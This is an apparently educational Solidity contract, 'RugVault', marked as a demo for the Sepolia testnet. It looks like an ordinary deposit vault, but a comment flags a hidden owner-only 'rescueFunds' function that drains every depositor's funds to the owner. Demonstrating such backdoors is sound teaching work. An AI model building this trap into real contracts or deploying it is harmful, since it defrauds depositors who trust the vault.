// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// DEMO ONLY (Sepolia, test ETH). A vault that looks normal, but the owner can take everyone's deposits.
contract RugVault {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    // The trap: the owner can send the whole pool to themselves at any time.
    function rescueFunds() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
